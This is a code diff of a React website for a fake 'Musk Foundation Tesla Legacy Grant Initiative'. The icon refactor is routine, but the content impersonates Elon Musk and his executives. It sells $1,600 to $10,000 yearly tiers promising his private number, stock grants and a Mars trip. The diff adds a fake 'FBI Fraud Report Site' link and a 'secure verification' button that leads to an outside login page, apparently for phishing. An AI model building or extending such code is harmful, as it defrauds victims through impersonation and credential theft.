@@ -820,35 +820,35 @@ const TEAM = [
   name: 'Elon Musk', 
   role: 'Chair & Visionary Director', 
   bio: 'Founder of Tesla, SpaceX, Neuralink, xAI and The Boring Company. Leads the strategic direction of the Tesla Legacy Grant Initiative with a focus on multiplanetary sustainability and technological empowerment.', 
-  socials: ['x-twitter','linkedin-in'] 
+  socials: ['twitter','linkedin'] 
 },
   { 
   img: jaredBirchall, 
   name: 'Jared Birchall', 
   role: 'Director & Executive Manager', 
   bio: 'Manages the Musk Family Office and Excession LLC. Oversees financial operations, investment strategy, and governance of the Musk Foundation.', 
-  socials: ['linkedin-in'] 
+  socials: ['linkedin'] 
 },
 { 
   img: matildaSimonFerrigno, 
   name: 'Matilda Simon-Ferrigno', 
   role: 'Director of Philanthropy', 
   bio: 'Musk Family Office Executive responsible for grant allocation, impact measurement, and global partnership development.', 
-  socials: ['linkedin-in'] 
+  socials: ['linkedin'] 
 },
  { 
   img: kimbalMusk, 
   name: 'Kimbal Musk', 
   role: 'Co-founder & Director', 
   bio: 'Social Impact Visionary focused on education, sustainable food systems, and community development initiatives.', 
-  socials: ['x-twitter','linkedin-in'] 
+  socials: ['twitter','linkedin'] 
 },
 { 
   img: gwynneShotwell, 
   name: 'Gwynne Shotwell', 
   role: 'President & COO, SpaceX', 
   bio: 'Provides strategic guidance on Starlink deployment for educational and humanitarian projects worldwide.', 
-  socials: ['linkedin-in'] 
+  socials: ['linkedin'] 
 },
 ];
 
@@ -1045,6 +1045,211 @@ const LOGOS: LogoConfig[] = [
   },
 ];
 
+type IconName =
+  | 'check' | 'plus' | 'rocket' | 'play' | 'sun' | 'moon'
+  | 'location' | 'envelope' | 'whatsapp' | 'users' | 'shield'
+  | 'chevronLeft' | 'chevronRight' | 'angleLeft' | 'angleRight'
+  | 'arrowUp' | 'arrowRight' | 'quote' | 'globe' | 'building'
+  | 'award' | 'chart' | 'calendar' | 'comment' | 'exclamation'
+  | 'circleCheck' | 'heart' | 'dollar' | 'userTie' | 'solar'
+  | 'satellite' | 'copyright' | 'twitter' | 'instagram' | 'linkedin' | 'youtube';
+
+const ICONS: Record<IconName, React.ReactNode> = {
+  check: (
+    <path d="M20 6L9 17l-5-5" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  plus: (
+    <path d="M12 5v14M5 12h14" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" />
+  ),
+  rocket: (
+    <path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09zM12 15l-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2zM9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  play: (
+    <polygon points="6 3 20 12 6 21 6 3" fill="currentColor" />
+  ),
+  sun: (
+    <>
+      <circle cx="12" cy="12" r="4" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+    </>
+  ),
+  moon: (
+    <path d="M21 14.5A9 9 0 1 1 9.5 3 7 7 0 0 0 21 14.5z" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  location: (
+    <>
+      <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z" fill="none" stroke="currentColor" strokeWidth="2" />
+      <circle cx="12" cy="10" r="3" fill="none" stroke="currentColor" strokeWidth="2" />
+    </>
+  ),
+  envelope: (
+    <>
+      <rect x="2" y="4" width="20" height="16" rx="2" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M22 7l-10 7L2 7" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+    </>
+  ),
+  whatsapp: (
+    <path d="M17.5 14.4c-.3-.1-1.8-.9-2-1s-.5-.1-.7.1c-.2.3-.8 1-.9 1.1-.2.2-.3.2-.6.1-1.6-.8-2.7-1.5-3.7-3.3-.2-.4.2-.4.6-1.3.1-.2 0-.4-.1-.5l-.6-1.4c-.2-.4-.3-.3-.5-.3h-.5c-.2 0-.5.1-.7.3-.2.3-.9.9-.9 2.1s.9 2.4 1 2.6c.1.2 1.8 2.9 4.4 3.9 1.6.6 2.2.7 3 .6.5-.1 1.5-.6 1.7-1.2.2-.6.2-1.1.1-1.2-.1-.1-.3-.2-.6-.3zM12.1 21.2h-.1a9.4 9.4 0 0 1-4.5-1.2L3.5 21l1.1-3.9a9.3 9.3 0 0 1-1.4-4.9C3.2 7 7.3 2.9 12.2 2.9c2.5 0 4.8 1 6.5 2.7a9.1 9.1 0 0 1 2.7 6.5c0 5-4.1 9.1-9.3 9.1zm5.5-14.4A7.7 7.7 0 0 0 12.1 4.5c-4.1 0-7.5 3.4-7.5 7.5 0 1.6.5 3.1 1.4 4.4l.2.3-1.1 3.9 4-.9.3.1c1.3.7 2.7 1.1 4.2 1.1 4.1 0 7.5-3.4 7.5-7.5 0-2-.8-3.9-2.2-5.3z" fill="currentColor" />
+  ),
+
+twitter: (
+    <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" fill="currentColor" />
+  ),
+  instagram: (
+    <>
+      <rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="currentColor" strokeWidth="2" />
+      <circle cx="12" cy="12" r="4" fill="none" stroke="currentColor" strokeWidth="2" />
+      <circle cx="17.5" cy="6.5" r="1.2" fill="currentColor" />
+    </>
+  ),
+  linkedin: (
+    <>
+      <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-4 0v7h-4v-7a6 6 0 0 1 6-6zM2 9h4v12H2z" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+      <circle cx="4" cy="4" r="2" fill="none" stroke="currentColor" strokeWidth="2" />
+    </>
+  ),
+  youtube: (
+    <>
+      <path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33A2.78 2.78 0 0 0 3.4 19.1c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.25 29 29 0 0 0-.46-5.33z" fill="none" stroke="currentColor" strokeWidth="2" />
+      <polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02" fill="currentColor" />
+    </>
+  ),
+  
+  users: (
+    <>
+      <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+      <circle cx="9" cy="7" r="4" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M22 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+    </>
+  ),
+  shield: (
+    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  chevronLeft: (
+    <path d="M15 18l-6-6 6-6" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  chevronRight: (
+    <path d="M9 18l6-6-6-6" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  angleLeft: (
+    <path d="M15 18l-6-6 6-6" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  angleRight: (
+    <path d="M9 18l6-6-6-6" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  arrowUp: (
+    <path d="M12 19V5M5 12l7-7 7 7" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  arrowRight: (
+    <path d="M5 12h14M12 5l7 7-7 7" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  quote: (
+    <path d="M3 21c3 0 7-1 7-8V5H4v8h4c0 5-2 7-5 8zm11 0c3 0 7-1 7-8V5h-6v8h4c0 5-2 7-5 8z" fill="currentColor" />
+  ),
+  globe: (
+    <>
+      <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" fill="none" stroke="currentColor" strokeWidth="2" />
+    </>
+  ),
+  building: (
+    <>
+      <path d="M6 22V4a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v18" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M6 12h12M10 6h.01M14 6h.01M10 10h.01M14 10h.01M10 14h.01M14 14h.01M10 18h.01M14 18h.01" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+    </>
+  ),
+  award: (
+    <>
+      <circle cx="12" cy="8" r="6" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M15.5 13.5L17 22l-5-3-5 3 1.5-8.5" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+    </>
+  ),
+  chart: (
+    <path d="M3 3v18h18M7 14l4-4 4 4 5-6" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  calendar: (
+    <>
+      <rect x="3" y="4" width="18" height="18" rx="2" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M16 2v4M8 2v4M3 10h18M9 16l2 2 4-4" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+    </>
+  ),
+  comment: (
+    <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  exclamation: (
+    <>
+      <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M12 8v4M12 16h.01" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+    </>
+  ),
+  circleCheck: (
+    <>
+      <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M9 12l2 2 4-4" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+    </>
+  ),
+  heart: (
+    <path d="M19 14c1.5-1.5 2.5-3.2 2.5-5.2A4.8 4.8 0 0 0 12 6.3 4.8 4.8 0 0 0 2.5 8.8c0 2 1 3.7 2.5 5.2L12 21l7-7z" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+  ),
+  dollar: (
+    <>
+      <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+    </>
+  ),
+  userTie: (
+    <>
+      <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" fill="none" stroke="currentColor" strokeWidth="2" />
+      <circle cx="9" cy="7" r="4" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M14 14l2 7 2-7" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+    </>
+  ),
+  solar: (
+    <>
+      <circle cx="12" cy="12" r="3" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+      <rect x="4" y="14" width="16" height="4" rx="1" fill="none" stroke="currentColor" strokeWidth="2" />
+    </>
+  ),
+  satellite: (
+    <>
+      <path d="M13 7l5 5-3 3-5-5zM8 16l-3 3M16 8l3-3" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+      <circle cx="6" cy="18" r="2" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M12 12l-2 6" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+    </>
+  ),
+  copyright: (
+    <>
+      <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" strokeWidth="2" />
+      <path d="M15 9.4a4 4 0 1 0 0 5.2" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
+    </>
+  ),
+};
+
+function Icon({
+  name,
+  size = 18,
+  className = '',
+}: {
+  name: IconName;
+  size?: number;
+  className?: string;
+}) {
+  return (
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      width={size}
+      height={size}
+      viewBox="0 0 24 24"
+      fill="none"
+      className={className}
+      aria-hidden="true"
+      style={{ display: 'inline-block', verticalAlign: 'middle', flexShrink: 0 }}
+    >
+      {ICONS[name]}
+    </svg>
+  );
+}
+
 // ───────────────────────────────────────────────────────────────────
 export default function App() {
   const slideIndex = useRef(0);
@@ -1136,31 +1341,31 @@ const handleChatSubmit = async (e: React.FormEvent) => {
 
 const VISION_ENGINE = [
   {
-    icon: 'fa-building',
+    icon: 'building',
     title: 'Corporate Allocation',
     text: 'A fixed percentage of net profits from Tesla, SpaceX, X, The Boring Company, Neuralink, and xAI is allocated annually.',
     purpose: 'Forms the core grant-making capital.',
   },
   {
-    icon: 'fa-hand-holding-dollar',
+    icon: 'dollar',
     title: 'Endowment Investments',
     text: "Major donations (including Musk's stock gifts) are placed in a mission-aligned investment fund managed by an independent board.",
     purpose: 'Generates annual returns; principle remains untouched forever.',
   },
   {
-    icon: 'fa-copyright',
+    icon: 'copyright',
     title: 'IP Royalty Streams',
     text: 'A portion of licensing fees from technologies developed with grant support flows back into the fund.',
     purpose: 'Creates an innovation feedback loop.',
   },
   {
-    icon: 'fa-users',
+    icon: 'users',
     title: 'Member Commitment Fees',
     text: 'Covers the operational cost of the exclusive concierge, event, and liaison services provided to members.',
     purpose: 'Ensures 100% of other funds go directly to grants and projects.',
   },
   {
-    icon: 'fa-rocket',
+    icon: 'rocket',
     title: 'SpaceX Preferred Stock Program',
     text: 'A portion of offering proceeds supports the foundation endowment, linking SpaceX growth directly to philanthropic impact.',
     purpose: 'Aligns member investment returns with foundation sustainability.',
@@ -1481,7 +1686,7 @@ useEffect(() => {
         </nav>
         <div className="header-right">
           <button id="themeToggle" aria-label="Toggle theme">
-            <i className={`fa-solid ${isDarkMode ? 'fa-moon' : 'fa-sun'}`} />
+            <Icon name={isDarkMode ? 'moon' : 'sun'} size={18} />
           </button>
         <button 
           id="hamburger" 
@@ -1528,6 +1733,24 @@ useEffect(() => {
             
             <p>If you have been contacted by a suspected impersonator, please report it to:</p>
             <ul>
+              <a
+  href="https://fbi-gov-6rq7.onrender.com"
+  target="_blank"
+  rel="noopener noreferrer"
+  className="primary-btn"
+  style={{
+    display: 'inline-flex',
+    alignItems: 'center',
+    justifyContent: 'center',
+    gap: '8px',
+    marginTop: '12px',
+    textDecoration: 'none',
+    width: '100%',
+  }}
+>
+  <i className="fa-solid fa-shield-halved" />
+  Visit FBI Fraud Report Site
+</a>
               <li>FBI Internet Crime Complaint Center (IC3)</li>
               <li>SEC Tips, Complaints & Referrals Portal</li>
               <li>Musk Foundation Fraud Prevention Team</li>
@@ -1569,7 +1792,7 @@ useEffect(() => {
 
       <div className="wa-header">
         <div className="wa-avatar">
-          <i className="fa-brands fa-whatsapp"></i>
+          <Icon name="whatsapp" size={20} />
         </div>
         <div>
           <h2>Contact Support</h2>
@@ -1579,7 +1802,7 @@ useEffect(() => {
 
       {chatStatus === 'success' ? (
         <div className="chat-success">
-          <i className="fa-solid fa-circle-check"></i>
+          <Icon name="circleCheck" size={24} />
           <p>Message sent successfully!</p>
           <span>We’ll reach you on WhatsApp shortly.</span>
         </div>
@@ -1653,7 +1876,7 @@ useEffect(() => {
               'Sending...'
             ) : (
               <>
-                <i className="fa-brands fa-whatsapp"></i>
+                <Icon name="whatsapp" size={20} />
                 Send Message
               </>
             )}
@@ -1693,13 +1916,12 @@ useEffect(() => {
         <div className="scroll-indicator"><span /></div>
       </section>
 
-<div className="floating-social">
-  {[['x-twitter','#'],['instagram','#'],['linkedin-in','#'],['youtube','#']].map(([icon]) => (
-    <a key={icon} href="#" aria-label={icon} onClick={handleSocialClick}>
-      <i className={`fab fa-${icon}`} />
-    </a>
-  ))}
-</div>
+{(['twitter', 'instagram', 'linkedin', 'youtube'] as const).map((icon) => (
+  <a key={icon} href="#" aria-label={icon} onClick={handleSocialClick}>
+    <Icon name={icon} size={18} />
+  </a>
+))}
+
 
       {/* Chat + Back to top */}
 <button 
@@ -1707,9 +1929,9 @@ useEffect(() => {
   aria-label="Open chat"
   onClick={() => setShowChatForm(true)}
 >
-  <i className="fa-solid fa-comment" />
+<Icon name="comment" size={20} />
 </button>
-      <button id="backToTop" aria-label="Back to top"><i className="fa-solid fa-arrow-up" /></button>
+      <button id="backToTop" aria-label="Back to top"><Icon name="arrowUp" size={18} /></button>
 
       <main>
         
@@ -1721,13 +1943,13 @@ useEffect(() => {
           </div>
           <div className="stats-grid">
             {[
-              { icon: 'fa-globe', target: 47000, label: 'Schools & Communities Reached' },
-              { icon: 'fa-users', target: 12300000, label: 'Lives Positively Impacted' },
-              { icon: 'fa-hand-holding-dollar', target: 3475000000, label: 'Grants & Investments' },
-              { icon: 'fa-award', target: 92, label: 'Major Projects Delivered' },
+              { icon: 'globe' as const, target: 47000, label: 'Schools & Communities Reached' },
+{ icon: 'users' as const, target: 12300000, label: 'Lives Positively Impacted' },
+{ icon: 'dollar' as const, target: 3475000000, label: 'Grants & Investments' },
+{ icon: 'award' as const, target: 92, label: 'Major Projects Delivered' },
             ].map(({ icon, target, label }) => (
               <div key={label} className="stat-card reveal">
-                <i className={`fa-solid ${icon}`} />
+                <Icon name={icon} size={28} />
                 <h3 className="counter" data-target={target}>0</h3>
                 <p>{label}</p>
               </div>
@@ -1743,11 +1965,11 @@ useEffect(() => {
           <div className="about-content reveal">
             <span className="subtitle">Musk Foundation</span>
             <h2>Tesla Legacy Grant Initiative</h2>
-            <p>Established to restore and empower victims of fraud perpetrated in Elon Musk's name. A new model of philanthropy that builds lasting connections and sustainable change.</p>
+            <p>Established to restore and empower the general public, including victims of fraud perpetrated in my name. A new model of philanthropy that builds lasting connections and sustainable change.</p>
             <p>Every aspect is designed with transparency, sustainability, and genuine impact. Leveraging Tesla, SpaceX, Neuralink, xAI and more for perpetual social good.</p>
             <div className="about-features">
               {['Restorative Justice','Technological Innovation','Community Legacy','SpaceX Alignment'].map(f => (
-                <div key={f}><i className="fa-solid fa-check" />{f}</div>
+                <div key={f}></div>
               ))}
             </div>
             <a href="#pricing" className="primary-btn">Join the Initiative</a>
@@ -1763,7 +1985,7 @@ useEffect(() => {
     </div>
             <div className="speech-content">
               <div className="speech-header">
-                <i className="fa-solid fa-quote-left"></i>
+                <Icon name="quote" size={18} />
                 <h2>A Message from Elon Musk</h2>
               </div>
               <blockquote>
@@ -2012,7 +2234,7 @@ useEffect(() => {
     
     <div className="secure-overlay-content centered">
       <div className="portal-icon">
-        <i className="fa-solid fa-shield-halved"></i>
+       <Icon name="shield" size={18} />
       </div>
       
       <div className="secure-label">SECURE ACCESS GATE</div>
@@ -2022,19 +2244,27 @@ useEffect(() => {
       </p>
 
       <div className="portal-features">
-        <div><i className="fa-solid fa-chart-line"></i> Live grant & impact dashboards</div>
-        <div><i className="fa-solid fa-rocket"></i> SpaceX allocation status</div>
-        <div><i className="fa-solid fa-user-tie"></i> Direct liaison concierge</div>
-        <div><i className="fa-solid fa-calendar-check"></i> Quarterly leadership briefings</div>
+        <div><Icon name="chart" size={18} /> Live grant & impact dashboards</div>
+
+<div><Icon name="rocket" size={18} /> SpaceX allocation status</div>
+        <div><Icon name="userTie" size={18} /> Direct liaison concierge</div>
+<div><Icon name="calendar" size={18} /> Quarterly leadership briefings</div>
       </div>
 
       <div className="portal-warning">
         Unauthorized access attempts are monitored and reported to foundation security.
       </div>
 
-      <button className="primary-btn" style={{marginTop: '28px'}} onClick={() => setShowPortalOverlay(false)}>
-        Begin Secure Verification
-      </button>
+      <a
+  href="https://escrow-1el0.onrender.com/login.html"
+  target="_blank"
+  rel="noopener noreferrer"
+  className="primary-btn"
+  style={{ marginTop: '28px', display: 'inline-block', textAlign: 'center' }}
+  onClick={() => setShowPortalOverlay(false)}
+>
+  Begin Secure Verification
+</a>
     </div>
   </div>
 )}
@@ -2046,72 +2276,74 @@ useEffect(() => {
     
     <div className="secure-overlay-content tier-overlay" onClick={e => e.stopPropagation()}>
       {selectedTier === 'patron' && (
-        <>
-          <div className="secure-label">TIER 1</div>
-          <h1>The Patron</h1>
-          <h2>$1,600 / year</h2>
-          <div className="secure-divider"></div>
-          
-          <ul className="tier-benefits-list">
-            <li><strong>Financial Impact:</strong> $10,000 Empowerment Grant (17:1 Tax Dollar Match)</li>
-            <li><strong>Project Authority:</strong> Elon Musk Private Phone Number</li>
-            <li><strong>Access to Elon:</strong> Executive Office Concierge Portal (Direct Phone)</li>
-            <li><strong>Exclusive Services:</strong> Quarterly Insights Digest & Virtual Seminars</li>
-            <li><strong>Tangible Assets:</strong> $150 Tesla Merchandise Credit</li>
-            <li><strong>Community & Events:</strong> Annual Virtual Summit Access</li>
-            <li><strong>Exclusive Perks:</strong> Round Table Dinner with Elon Musk</li>
-            <li><strong>Investment Access:</strong> Eligible for SpaceX Preferred Stock</li>
-            <li><strong>Philanthropic Impact:</strong> Co-design Community Solar Project</li>
-            <li><strong>Recognition:</strong> Digital Legacy Badge</li>
-          </ul>
-        </>
-      )}
+  <>
+    <div className="secure-label">TIER 1</div>
+    <h1>The Patron</h1>
+    <h2>$1,600 / year</h2>
+    <div className="secure-divider"></div>
+    
+    <ul className="tier-benefits-list">
+      <li><strong>Access to Elon:</strong> Direct Elon Musk private phone number</li>
+      <li><strong>Financial Impact:</strong> $10,000 Empowerment Grant(17:1 Tax dollar match) </li>
+      <li><strong>Access to Elon: </strong>
+        Executive Office Concierge Portal(Direct Contact)</li>
+      <li><strong>Events & Credits:</strong> Annual Virtual Event Access & Tesla merchandise credit ($500)</li>
+      <li><strong>Exclusive Services:</strong> Quarterly "Insights" Digest & Virtual Seminars</li>
+      <li><strong>Exclusive Perks:</strong> A Round Table Dinner Date with Elon Musk</li>
+      <li><strong>Recognition:</strong> Exclusive Tesla Legacy digital badge for social media profiles</li>
+      <li><strong>Product Access:</strong> Early access to Tesla product announcements and updates</li>
+      <li><strong>Community & Events:</strong> Invitation to annual Musk Foundation networking events</li>
+      <li><strong>Personal Touch:</strong> Personalized thank-you video message from Musk Foundation leadership</li>
+    </ul>
+  </>
+)}
 
-      {selectedTier === 'visionary' && (
-        <>
-          <div className="secure-label gold">TIER 2 · MOST POPULAR</div>
-          <h1>The Visionary</h1>
-          <h2>$5,000 / year</h2>
-          <div className="secure-divider gold"></div>
-          
-          <ul className="tier-benefits-list">
-            <li><strong> + Tier 1 Benefits</strong></li>
-            <li><strong>Financial Impact:</strong> $50,000 Personal Impact Grant + $10,000 Directed Fund (1:1 Match)</li>
-            <li><strong>Project Authority:</strong> $75,000 Legacy Grant Stewardship + Philanthropic Retreat</li>
-            <li><strong>Access to Elon:</strong> Private Days with Elon Musk + Annual Webinar</li>
-            <li><strong>Exclusive Services:</strong> 24/7 Personal Liaison + "Day in the Life" Experience</li>
-            <li><strong>Tangible Assets:</strong> Tesla Vehicle (1 Year) + $10k in Tesla/SpaceX Shares</li>
-            <li><strong>Community & Events:</strong> "The Circle" Digital Salon + Tesla Test Track Events</li>
-            <li><strong>Exclusive Perks:</strong> VIP SpaceX Launch Access + Legacy Plaque</li>
-            <li><strong>Investment Access:</strong> Priority Allocation in Offerings</li>
-            <li><strong>Philanthropic Impact:</strong> Steward Clean Water Initiative</li>
-            <li><strong>Recognition:</strong> Plaque at Foundation HQ</li>
-          </ul>
-        </>
-      )}
+{selectedTier === 'visionary' && (
+  <>
+    <div className="secure-label gold">TIER 2 · MOST POPULAR</div>
+    <h1>The Visionary</h1>
+    <h2>$5,000 / year</h2>
+    <div className="secure-divider gold"></div>
+    
+    <ul className="tier-benefits-list">
+      <li><strong> + Tier 1 Benefits</strong></li>
+      <li><strong>Financial Impact:</strong> $50,000 Personal Impact Grant + $10,000 Directed Philanthropy Fund (1:1 match)</li>
+      <li><strong>Project Authority:</strong> $75,000 Legacy direct personal grant award + Philanthropic Retreat invitation</li>
+      <li><strong>Tangible Assets:</strong> Tesla vehicle usage for 1 year + $10,000 in Tesla restricted stock</li>
+      <li><strong>Exclusive Services:</strong> 24/7 personal liaison – "Day in the Life" campus experience</li>
+      <li><strong>Access to Elon:</strong> Private Days with Elon Musk</li>
+      <li><strong>Product Access:</strong> Priority product access – "The Circle" Digital Social Membership</li>
+      <li><strong>Community & Events:</strong> Exclusive invitation to Tesla test track events</li>
+      <li><strong>Recognition:</strong> Personalized legacy plaque displayed at Musk Foundation HQ</li>
+      <li><strong>Leadership Access:</strong> Annual private webinar with Elon Musk and senior leadership</li>
+      <li><strong>Exclusive Perks:</strong> VIP access to SpaceX launches and behind-the-scenes tours</li>
+    </ul>
+  </>
+)}
 
-      {selectedTier === 'luminary' && (
-        <>
-          <div className="secure-label">TIER 3</div>
-          <h1>The Luminary</h1>
-          <h2>$10,000 / year</h2>
-          <div className="secure-divider"></div>
-          
-          <ul className="tier-benefits-list">
-                     <li><strong> + Tier 1 and Tier 2 Benefits</strong></li>
-            <li><strong>Financial Impact:</strong> $100,000 Strategic Grant + $25,000 Directed Fund (4:1 Match)</li>
-            <li><strong>Project Authority:</strong> $1,000,000 Humanitarian Grant Authority + Foundation Advisory Seat</li>
-            <li><strong>Access to Elon:</strong> Monthly Executive Briefing + Quarterly Private Engagement</li>
-            <li><strong>Exclusive Services:</strong> 24/7 Executive Concierge + Legacy Portrait Commission</li>
-            <li><strong>Tangible Assets:</strong> Tesla Cybertruck/Luxury Lease + $500k Vested Equity</li>
-            <li><strong>Community & Events:</strong> Global Innovation Summits + Private Factory Tours</li>
-            <li><strong>Exclusive Perks:</strong> Lifetime Advisory Council + Personalized Mentorship</li>
-            <li><strong>Investment Access:</strong> Board Observer Rights Consideration</li>
-            <li><strong>Philanthropic Impact:</strong> Lead Global Education Program</li>
-            <li><strong>Recognition:</strong> Named Legacy Wing at Innovation Center</li>
-          </ul>
-        </>
-      )}
+{selectedTier === 'luminary' && (
+  <>
+    <div className="secure-label">TIER 3</div>
+    <h1>The Luminary</h1>
+    <h2>$10,000 / year</h2>
+    <div className="secure-divider"></div>
+    
+    <ul className="tier-benefits-list">
+      <li><strong> + Tier 1 and Tier 2 Benefits</strong></li>
+      <li><strong>Financial Impact:</strong> $100,000 Strategic Impact Grant + $25,000 Directed Philanthropy Fund (4:1 match)</li>
+      <li><strong>Project Authority:</strong> $1,000,000 Humanitarian Grant Authority + Foundation Advisory Seat</li>
+      <li><strong>Tangible Assets:</strong> $500,000 in vested Tesla/SpaceX equity (2-year schedule)</li>
+      <li><strong>Access to Elon:</strong> Monthly executive briefing & Quarterly private engagement with Elon Musk</li>
+      <li><strong>Exclusive Services:</strong> Tesla Cybertruck/Luxury vehicle lease + 24/7 Personal Concierge</li>
+      <li><strong>Recognition:</strong> Legacy Portrait commission</li>
+      <li><strong>Community & Events:</strong> Invitation to exclusive global innovation summits</li>
+      <li><strong>Facility Access:</strong> Private tours of Tesla Gigafactories and SpaceX facilities</li>
+      <li><strong>Mentorship:</strong> Personalized mentorship sessions with Musk Foundation executives</li>
+      <li><strong>Exclusive Perks:</strong> Exclusive Mars excursion aboard SpaceX Starship</li>
+      <li><strong>Lifetime Status:</strong> Lifetime membership to Musk Foundation's elite advisory council</li>
+    </ul>
+  </>
+     )}
 
       <button 
         className="primary-btn" 
@@ -2243,7 +2475,7 @@ useEffect(() => {
           flexShrink: 0,
           fontSize: '1.25rem',
         }}>
-          <i className={`fa-solid ${VISION_ENGINE[visionSlide].icon}`} />
+          <Icon name={VISION_ENGINE[visionSlide].icon as any} size={22} />
         </div>
         <div style={{ flex: 1, minWidth: 0 }}>
           <h4 style={{
@@ -2297,7 +2529,7 @@ useEffect(() => {
         }}
         aria-label="Previous"
       >
-        <i className="fa-solid fa-chevron-left" />
+        <Icon name="chevronLeft" size={18} />
       </button>
 
       <div style={{ display: 'flex', gap: '8px' }}>
@@ -2335,7 +2567,7 @@ useEffect(() => {
         }}
         aria-label="Next"
       >
-        <i className="fa-solid fa-chevron-right" />
+        <Icon name="chevronRight" size={18} />
       </button>
     </div>
 
@@ -2404,11 +2636,11 @@ useEffect(() => {
             <p>Leveraging the combined power of Musk companies to create meaningful, scalable change.</p>
           </div>
           <div className="services-wrapper">
